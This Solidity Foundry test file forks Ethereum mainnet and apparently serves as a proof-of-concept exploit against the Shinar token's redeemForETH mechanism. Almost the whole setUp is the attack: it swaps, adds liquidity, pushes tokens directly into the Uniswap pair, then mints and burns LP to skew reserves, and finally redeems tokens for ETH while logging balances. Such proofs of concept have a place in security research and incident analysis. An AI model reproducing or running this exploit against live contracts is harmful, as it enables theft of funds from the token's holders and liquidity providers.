// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import {Shinar, IERC20, IWETH, IUniswapV2Router02, IUniswapV2Pair} from "../src/Shinar.sol";

contract CounterTest is Test {
    Shinar shinar;
    IUniswapV2Router02 router;
    address WETH;
    IUniswapV2Pair pair =
        IUniswapV2Pair(0x07AfaFD3185941907EFB8d4FdF4064088CaDD34D);

    function setUp() public {
        vm.createSelectFork("mainnet", 19031092);
        shinar = Shinar(payable(0x323efd000a71F2567534e66eC6ae1b2b789a623a));
        router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        uint256 bal = shinar.balanceOf(address(this));
        console.log("Initial Shinar balance: %s", bal);

        bal = shinar.redeemRate();
        console.log("Redeem rate: %s", bal);

        // bytes memory commands = abi.encodePacked(bytes1(0x22));
        // bytes[] memory inputs = new bytes[](1); 
        // inputs[0] = abi.encodePacked(address(shinar), address(this));
        // router.execute(commands, inputs);

        bal = shinar.allowance(address(router), address(this));
        console.log("Allowance from router is %s", bal);

        vm.deal(address(this), 2000 ether);

        WETH = router.WETH();

        console.log("WETH address: %s", WETH);

        IWETH(WETH).deposit{value: 500 ether}();

        bal = IERC20(WETH).balanceOf(address(this));
        console.log("Initial WETH balance: %s", bal);

        address token0 = pair.token0();
        address token1 = pair.token1();

        console.log("token0: %s", token0);
        console.log("token1: %s", token1);

        (uint256 a, uint256 b, ) = pair.getReserves();
        console.log("price: %s", b * 1 ether / a);

        bal = pair.totalSupply();
        console.log("Initial total supply in LP: %s", bal);

        bal = IERC20(token0).balanceOf(address(pair));
        console.log("Initial SHN balance in pair: %s", bal);
        bal = IERC20(token1).balanceOf(address(pair));
        console.log("Initial wETH balance in pair: %s", bal);

        IERC20(WETH).approve(address(router), type(uint256).max);
        shinar.approve(address(router), type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = address(shinar);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(100 ether, 0, path, address(this), block.timestamp);

        (, , uint256 gotLP) = router.addLiquidityETH{value: 100 ether}(
            address(shinar),
            1000_000e18,
            0,
            0,
            address(this),
            block.timestamp
        );

        console.log("Got LP %s", gotLP);

        bal = pair.balanceOf(address(this));
        console.log("End LP balance in this: %s", bal);

        bal = shinar.balanceOf(address(this));
        console.log("End Shinar balance: %s", bal);



        bool success = IERC20(address(shinar)).transfer(address(pair), shinar.balanceOf(address(this)));
        require(success, "Transfer SHN failed");

        success = IERC20(WETH).transfer(address(pair), 1 ether);
        require(success, "Transfer WETH failed");

        bal = IERC20(WETH).balanceOf(address(pair));
        console.log("WETH.balanceOf(pair) = ", bal);

        bal = IERC20(address(shinar)).balanceOf(address(pair));
        console.log("SHN.balanceOf(pair) = ", bal);

        (a, b, ) = pair.getReserves();
        console.log("Reserves SHN: %s, WETH: %s", a, b);

        console.log("Minting");
        pair.mint(address(this));

        bal = pair.balanceOf(address(this));
        console.log("End LP balance in this: %s", bal);

        bal = IERC20(token1).balanceOf(address(pair));
        console.log("End wETH balance in pair: %s", bal);

        (a, b, ) = pair.getReserves();
        console.log("price: %s", b * 1 ether / a);

        uint256 liquidity = pair.balanceOf(address(pair));
        console.log("Final liquidity: %s", liquidity);

        IWETH(WETH).transfer(address(pair), 100 ether);

        success = pair.transfer(address(pair), pair.balanceOf(address(this)));
        require(success, "Transfer LP failed");

        console.log("Burning");
        pair.burn(address(this));
        // pair.skim(address(this));


        bal = shinar.redeemRate();
        console.log("Redeem rate: %s", bal);

        bal = shinar.balanceOf(address(this));
        console.log("End Shinar balance: %s", bal);

        shinar.redeemForETH(bal);

        console.log("final balance", address(this).balance + IWETH(WETH).balanceOf(address(this)));

    }

    function test_Increment() public {}

    receive() payable external{
        console.log("Recieve ETH %s", msg.value);
    }
}
